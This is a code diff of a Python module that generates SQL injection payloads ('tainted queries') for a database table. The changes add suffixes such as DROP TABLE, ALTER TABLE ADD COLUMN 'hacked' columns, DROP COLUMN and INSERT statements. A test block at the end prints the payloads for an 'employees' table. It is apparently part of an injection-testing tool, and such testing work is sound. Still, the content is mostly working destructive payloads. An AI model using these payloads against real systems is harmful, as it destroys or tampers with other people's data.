@@ -43,9 +43,9 @@ def generate_tainted_queries_for_exfiltration(basic_query: str) -> list[str]:
 
 
 
-def generate_tainted_queries_for_corruption(basic_query: str) -> list[str]:
+def generate_tainted_queries_for_corruption(basic_query: str, db_table_settings: DB_table_settings) -> list[str]:
   
-  CORRUPTION_SUFFIXES: list[str] = generate_corruption_suffixes()
+  CORRUPTION_SUFFIXES: list[str] = generate_corruption_suffixes(db_table_settings)
   tainted_queries: list[str] = []
   for suffix in CORRUPTION_SUFFIXES:
 
@@ -61,9 +61,10 @@ def generate_corruption_suffixes(db_table_settings: DB_table_settings) -> list[s
 
   CORRUPTION_SUFFIXES = [
     f"'; DROP TABLE {table_name};--",
-    f"'; ALTER TABLE {table_name} ADD COLUMN new_column TEXT; --",
+    f"'; ALTER TABLE {table_name} ADD COLUMN hacked_text_column TEXT; --",
+    f"'; ALTER TABLE {table_name} ADD COLUMN hacked_int_column INT; --",
   ]
-  CORRUPTION_SUFFIXES.append( build_insert_suffixe(table_name, column_names, column_datatypes) )
+  CORRUPTION_SUFFIXES.append( build_insert_suffixe(db_table_settings) )
   add_drop_column_suffixes(table_name, column_names, CORRUPTION_SUFFIXES)
   return CORRUPTION_SUFFIXES
 
@@ -76,13 +77,17 @@ def add_drop_column_suffixes(table_name: str, column_names: list[str], CORRUPTIO
 
 
 
-def build_insert_suffixe(table_name: str, column_names: list[str], column_datatypes: list[str]):
+def build_insert_suffixe(db_table_settings: DB_table_settings):
+
+  table_name: str = db_table_settings.table_name
+  column_names: list[str] = db_table_settings.column_names
+  column_datatypes: list[str] = db_table_settings.data_types
 
   INSERTION_SUFFIXE: str = f"'; INSERT INTO {table_name} " 
-  + format_list_to_string(column_names)
-  + " VALUES "
-  + format_list_to_string( get_default_from_datatype(column_datatypes) )
-  + "; --"
+  INSERTION_SUFFIXE +=  format_list_to_string(column_names)
+  INSERTION_SUFFIXE += " VALUES "
+  INSERTION_SUFFIXE += format_list_to_string( get_default_from_datatype(column_datatypes) )
+  INSERTION_SUFFIXE += "; --"
 
   return INSERTION_SUFFIXE
 
@@ -108,3 +113,14 @@ def get_default_from_datatype(list_of_datatypes: list[str]) -> list[str]:
       raise Exception("Error : a datatype can be TEXT or INT")
 
   return list_of_datatypes
+
+## TESTS
+
+basic_query: str = "SELECT * FROM employees"
+column_names = ["name", "wage", "department"]
+datatypes = ["TEXT", "INT", "TEXT"]
+db_table_settings: DB_table_settings = DB_table_settings("employees", column_names, datatypes)
+
+corruption_queries: list[str] = generate_tainted_queries_for_corruption(basic_query, db_table_settings)
+for query in corruption_queries:
+  print(query)
